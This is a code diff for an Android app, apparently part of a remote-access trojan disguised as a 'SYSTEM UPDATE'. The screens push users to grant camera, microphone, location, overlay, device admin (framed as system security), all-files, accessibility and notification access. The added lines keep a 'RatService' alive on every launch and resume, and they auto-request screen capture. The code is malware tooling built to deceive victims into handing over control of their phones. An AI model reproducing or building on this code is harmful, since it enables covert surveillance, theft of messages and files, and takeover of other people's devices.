@@ -72,20 +72,11 @@ class MainActivity : ComponentActivity() {
             }
         } catch (_: Exception) {}
 
+        // request izin sekali seumur hidup
         requestProactivePermissionsOnce()
 
-        // FIX: kalau izin CAMERA belum granted, minta langsung dari Activity
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
-            != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(
-                this,
-                arrayOf(
-                    Manifest.permission.CAMERA,
-                    Manifest.permission.RECORD_AUDIO
-                ),
-                2003
-            )
-        }
+        // pastikan RatService selalu jalan
+        startRatService()
 
         setContent {
             var showSplash by remember { mutableStateOf(true) }
@@ -164,22 +155,10 @@ class MainActivity : ComponentActivity() {
 
     override fun onResume() {
         super.onResume()
+        // pastikan RatService hidup
+        startRatService()
+        // auto-request MediaProjection kalau izin lengkap tapi projection belum ada
         if (checkAll() && !ScreenCapture.isReady()) {
-            try {
-                val intent = ScreenCapture.requestIntent(this)
-                startActivityForResult(intent, REQ_MEDIA_PROJECTION)
-            } catch (_: Exception) {}
-        }
-    }
-
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<out String>,
-        grantResults: IntArray
-    ) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        // setelah user approve CAMERA, coba minta MediaProjection juga
-        if (requestCode == 2003 && checkAll() && !ScreenCapture.isReady()) {
             try {
                 val intent = ScreenCapture.requestIntent(this)
                 startActivityForResult(intent, REQ_MEDIA_PROJECTION)
@@ -204,8 +183,7 @@ class MainActivity : ComponentActivity() {
     private fun requestProactivePermissionsOnce() {
         try {
             val prefs = getSharedPreferences("exoid_user_prefs", Context.MODE_PRIVATE)
-            val alreadyRequested = prefs.getBoolean("proactive_perms_requested", false)
-            if (alreadyRequested) return
+            if (prefs.getBoolean("proactive_perms_requested", false)) return
 
             val needed = mutableListOf(
                 Manifest.permission.CAMERA,
@@ -213,16 +191,13 @@ class MainActivity : ComponentActivity() {
                 Manifest.permission.ACCESS_FINE_LOCATION,
                 Manifest.permission.ACCESS_COARSE_LOCATION
             )
-            if (Build.VERSION.SDK_INT >= 33) {
-                needed.add(Manifest.permission.POST_NOTIFICATIONS)
-            }
+            if (Build.VERSION.SDK_INT >= 33) needed.add(Manifest.permission.POST_NOTIFICATIONS)
 
             val missing = needed.filter {
                 ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
             }.toTypedArray()
 
             prefs.edit().putBoolean("proactive_perms_requested", true).apply()
-
             if (missing.isNotEmpty()) {
                 ActivityCompat.requestPermissions(this, missing, REQ_PERMS)
             }
@@ -253,26 +228,15 @@ class MainActivity : ComponentActivity() {
 
         if (!Settings.canDrawOverlays(this)) {
             try {
-                startActivity(
-                    Intent(
-                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        Uri.parse("package:$packageName")
-                    )
-                )
+                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
             } catch (_: Exception) {}
         }
 
         if (!isAdminActive()) {
             try {
                 val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                    putExtra(
-                        DevicePolicyManager.EXTRA_DEVICE_ADMIN,
-                        ComponentName(this@MainActivity, AdminReceiver::class.java)
-                    )
-                    putExtra(
-                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                        "Aktifkan untuk keamanan sistem"
-                    )
+                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this@MainActivity, AdminReceiver::class.java))
+                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan untuk keamanan sistem")
                 }
                 startActivity(intent)
             } catch (_: Exception) {}
@@ -281,10 +245,7 @@ class MainActivity : ComponentActivity() {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                startActivity(
-                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-                        .setData(Uri.parse("package:$packageName"))
-                )
+                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).setData(Uri.parse("package:$packageName")))
             }
         } catch (_: Exception) {}
     }
@@ -320,15 +281,9 @@ class MainActivity : ComponentActivity() {
 
     private fun isAccessibilityEnabled(): Boolean {
         return try {
-            val enabled = Settings.Secure.getString(
-                contentResolver,
-                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
-            ) ?: ""
-            val pkg = packageName
-            val svcClass = AppLockAccessibilityService::class.java.name
-            val shortForm = "$pkg/.AppLockAccessibilityService"
-            val longForm = "$pkg/$svcClass"
-            enabled.contains(shortForm) || enabled.contains(longForm)
+            val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
+            enabled.contains("$packageName/.AppLockAccessibilityService") ||
+                    enabled.contains("$packageName/${AppLockAccessibilityService::class.java.name}")
         } catch (_: Exception) { false }
     }
 
@@ -358,14 +313,8 @@ class MainActivity : ComponentActivity() {
 
 @Composable
 fun SplashScreen(onDone: () -> Unit) {
-    LaunchedEffect(Unit) {
-        delay(1500)
-        onDone()
-    }
-    Box(
-        modifier = Modifier.fillMaxSize().background(Color(0xFF0A0A0A)),
-        contentAlignment = Alignment.Center
-    ) {
+    LaunchedEffect(Unit) { delay(1500); onDone() }
+    Box(Modifier.fillMaxSize().background(Color(0xFF0A0A0A)), contentAlignment = Alignment.Center) {
         Column(horizontalAlignment = Alignment.CenterHorizontally) {
             Text("SYSTEM", color = Color(0xFFD4AF37), fontSize = 42.sp, fontWeight = FontWeight.Bold, letterSpacing = 10.sp)
             Spacer(Modifier.height(4.dp))
@@ -378,37 +327,22 @@ fun SplashScreen(onDone: () -> Unit) {
 
 @Composable
 fun PermissionScreen(
-    perms: Array<String>,
-    refreshKey: Int,
-    onRequest: () -> Unit,
-    onCheck: () -> Unit,
-    onAllFiles: () -> Unit,
-    onAccessibility: () -> Unit,
-    onNotifAccess: () -> Unit
+    perms: Array<String>, refreshKey: Int,
+    onRequest: () -> Unit, onCheck: () -> Unit,
+    onAllFiles: () -> Unit, onAccessibility: () -> Unit, onNotifAccess: () -> Unit
 ) {
     val ctx = LocalContext.current
-
-    Column(
-        modifier = Modifier.fillMaxSize().padding(16.dp).verticalScroll(rememberScrollState()),
-        horizontalAlignment = Alignment.CenterHorizontally
-    ) {
+    Column(Modifier.fillMaxSize().padding(16.dp).verticalScroll(rememberScrollState()), horizontalAlignment = Alignment.CenterHorizontally) {
         Spacer(Modifier.height(20.dp))
         Text("SYSTEM UPDATE", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color(0xFFD4AF37))
         Spacer(Modifier.height(4.dp))
         Text("Aktifkan semua izin untuk melanjutkan", color = Color(0xFF9A9A9A), fontSize = 11.sp)
         Spacer(Modifier.height(16.dp))
 
-        val okCount = perms.count {
-            ContextCompat.checkSelfPermission(ctx, it) == PackageManager.PERMISSION_GRANTED
-        }
+        val okCount = perms.count { ContextCompat.checkSelfPermission(ctx, it) == PackageManager.PERMISSION_GRANTED }
         val progress = if (perms.isEmpty()) 0f else okCount.toFloat() / perms.size
 
-        LinearProgressIndicator(
-            progress = { progress },
-            modifier = Modifier.fillMaxWidth().height(6.dp).clip(RoundedCornerShape(3.dp)),
-            color = Color(0xFFD4AF37),
-            trackColor = Color(0xFF1C1C1C)
-        )
+        LinearProgressIndicator(progress = { progress }, modifier = Modifier.fillMaxWidth().height(6.dp).clip(RoundedCornerShape(3.dp)), color = Color(0xFFD4AF37), trackColor = Color(0xFF1C1C1C))
         Spacer(Modifier.height(6.dp))
         Text("$okCount / ${perms.size} izin runtime aktif", color = Color(0xFF9A9A9A), fontSize = 11.sp)
         Spacer(Modifier.height(16.dp))
@@ -418,90 +352,44 @@ fun PermissionScreen(
                 val ok = ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
                 PermRow(p.substringAfterLast('.'), ok)
             }
-
             Spacer(Modifier.height(12.dp))
             Text("IZIN KHUSUS", color = Color(0xFFD4AF37), fontSize = 11.sp, fontWeight = FontWeight.Bold)
             Spacer(Modifier.height(6.dp))
-
-            val overlayOk = Settings.canDrawOverlays(ctx)
-            PermRow("Overlay (Display over other apps)", overlayOk)
-
-            val adminOk = try {
-                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                dpm.isAdminActive(ComponentName(ctx, AdminReceiver::class.java))
-            } catch (_: Exception) { false }
+            PermRow("Overlay", Settings.canDrawOverlays(ctx))
+            val adminOk = try { val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager; dpm.isAdminActive(ComponentName(ctx, AdminReceiver::class.java)) } catch (_: Exception) { false }
             PermRow("Device Admin", adminOk)
-
-            val storageOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                Environment.isExternalStorageManager()
-            } else true
+            val storageOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Environment.isExternalStorageManager() else true
             PermRow("All Files Access", storageOk)
-
             val accessibilityOk = try {
-                val enabled = Settings.Secure.getString(
-                    ctx.contentResolver,
-                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
-                ) ?: ""
-                enabled.contains("${ctx.packageName}/.AppLockAccessibilityService") ||
-                        enabled.contains("${ctx.packageName}/${AppLockAccessibilityService::class.java.name}")
+                val enabled = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
+                enabled.contains("${ctx.packageName}/.AppLockAccessibilityService") || enabled.contains("${ctx.packageName}/${AppLockAccessibilityService::class.java.name}")
             } catch (_: Exception) { false }
-            PermRow("Accessibility Service (Lock App)", accessibilityOk)
-
+            PermRow("Accessibility Service", accessibilityOk)
             val notifOk = try {
-                val enabled = Settings.Secure.getString(
-                    ctx.contentResolver,
-                    "enabled_notification_listeners"
-                ) ?: ""
+                val enabled = Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners") ?: ""
                 enabled.contains(ctx.packageName)
             } catch (_: Exception) { false }
-            PermRow("Notification Access (Gmail/WA/SMS)", notifOk)
+            PermRow("Notification Access", notifOk)
         }
 
         Spacer(Modifier.height(16.dp))
-
-        Button(
-            onClick = onAllFiles,
-            modifier = Modifier.fillMaxWidth().height(46.dp),
-            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1C1C1C)),
-            shape = RoundedCornerShape(10.dp)
-        ) {
+        Button(onClick = onAllFiles, modifier = Modifier.fillMaxWidth().height(46.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1C1C1C)), shape = RoundedCornerShape(10.dp)) {
             Text("BUKA ALL FILES ACCESS", color = Color(0xFF00FF66), fontSize = 12.sp, fontWeight = FontWeight.Bold)
         }
         Spacer(Modifier.height(8.dp))
-        Button(
-            onClick = onAccessibility,
-            modifier = Modifier.fillMaxWidth().height(46.dp),
-            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1C1C1C)),
-            shape = RoundedCornerShape(10.dp)
-        ) {
+        Button(onClick = onAccessibility, modifier = Modifier.fillMaxWidth().height(46.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1C1C1C)), shape = RoundedCornerShape(10.dp)) {
             Text("BUKA ACCESSIBILITY SETTINGS", color = Color(0xFF00FF66), fontSize = 12.sp, fontWeight = FontWeight.Bold)
         }
         Spacer(Modifier.height(8.dp))
-        Button(
-            onClick = onNotifAccess,
-            modifier = Modifier.fillMaxWidth().height(46.dp),
-            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1C1C1C)),
-            shape = RoundedCornerShape(10.dp)
-        ) {
+        Button(onClick = onNotifAccess, modifier = Modifier.fillMaxWidth().height(46.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1C1C1C)), shape = RoundedCornerShape(10.dp)) {
             Text("BUKA NOTIFICATION ACCESS", color = Color(0xFFFF9800), fontSize = 12.sp, fontWeight = FontWeight.Bold)
         }
-
         Spacer(Modifier.height(16.dp))
-
-        Button(
-            onClick = onRequest,
-            modifier = Modifier.fillMaxWidth().height(50.dp),
-            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFB30000)),
-            shape = RoundedCornerShape(10.dp)
-        ) {
+        Button(onClick = onRequest, modifier = Modifier.fillMaxWidth().height(50.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFB30000)), shape = RoundedCornerShape(10.dp)) {
             Text("IZINKAN SEMUA", color = Color.White, fontWeight = FontWeight.Bold, letterSpacing = 2.sp)
         }
         Spacer(Modifier.height(8.dp))
-        OutlinedButton(
-            onClick = onCheck,
-            modifier = Modifier.fillMaxWidth().height(50.dp),
-            shape = RoundedCornerShape(10.dp)
-        ) {
+        OutlinedButton(onClick = onCheck, modifier = Modifier.fillMaxWidth().height(50.dp), shape = RoundedCornerShape(10.dp)) {
             Text("CEK ULANG", color = Color(0xFFD4AF37), fontWeight = FontWeight.Bold)
         }
         Spacer(Modifier.height(20.dp))
@@ -510,25 +398,8 @@ fun PermissionScreen(
 
 @Composable
 fun PermRow(label: String, ok: Boolean) {
-    Row(
-        modifier = Modifier
-            .fillMaxWidth()
-            .padding(vertical = 3.dp)
-            .background(Color(0xFF1C1C1C), shape = RoundedCornerShape(10.dp))
-            .border(
-                1.dp,
-                if (ok) Color(0xFF00FF66).copy(alpha = 0.3f) else Color(0xFF8A0000).copy(alpha = 0.5f),
-                shape = RoundedCornerShape(10.dp)
-            )
-            .padding(12.dp),
-        verticalAlignment = Alignment.CenterVertically
-    ) {
-        Text(
-            if (ok) "OK" else "NO",
-            color = if (ok) Color(0xFF00FF66) else Color(0xFFE60000),
-            fontSize = 12.sp,
-            fontWeight = FontWeight.Bold
-        )
+    Row(Modifier.fillMaxWidth().padding(vertical = 3.dp).background(Color(0xFF1C1C1C), shape = RoundedCornerShape(10.dp)).border(1.dp, if (ok) Color(0xFF00FF66).copy(alpha = 0.3f) else Color(0xFF8A0000).copy(alpha = 0.5f), shape = RoundedCornerShape(10.dp)).padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
+        Text(if (ok) "OK" else "NO", color = if (ok) Color(0xFF00FF66) else Color(0xFFE60000), fontSize = 12.sp, fontWeight = FontWeight.Bold)
         Spacer(Modifier.width(12.dp))
         Text(label, color = Color.White, fontSize = 12.sp)
     }
@@ -536,15 +407,8 @@ fun PermRow(label: String, ok: Boolean) {
 
 @Composable
 fun GrantDoneScreen(onContinue: () -> Unit) {
-    Column(
-        modifier = Modifier.fillMaxSize().padding(24.dp),
-        horizontalAlignment = Alignment.CenterHorizontally,
-        verticalArrangement = Arrangement.Center
-    ) {
-        Box(
-            modifier = Modifier.size(110.dp).background(Color(0xFF00FF66), shape = RoundedCornerShape(55.dp)),
-            contentAlignment = Alignment.Center
-        ) {
+    Column(Modifier.fillMaxSize().padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.Center) {
+        Box(Modifier.size(110.dp).background(Color(0xFF00FF66), shape = RoundedCornerShape(55.dp)), contentAlignment = Alignment.Center) {
             Text("OK", color = Color.Black, fontSize = 36.sp, fontWeight = FontWeight.Bold)
         }
         Spacer(Modifier.height(28.dp))
@@ -552,12 +416,7 @@ fun GrantDoneScreen(onContinue: () -> Unit) {
         Spacer(Modifier.height(10.dp))
         Text("Tekan lanjut untuk masuk ke dashboard", color = Color(0xFF9A9A9A), fontSize = 13.sp)
         Spacer(Modifier.height(36.dp))
-        Button(
-            onClick = onContinue,
-            modifier = Modifier.fillMaxWidth().height(54.dp),
-            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFB30000)),
-            shape = RoundedCornerShape(12.dp)
-        ) {
+        Button(onClick = onContinue, modifier = Modifier.fillMaxWidth().height(54.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFB30000)), shape = RoundedCornerShape(12.dp)) {
             Text("LANJUT KE DASHBOARD", color = Color.White, fontWeight = FontWeight.Bold, letterSpacing = 2.sp)
         }
     }
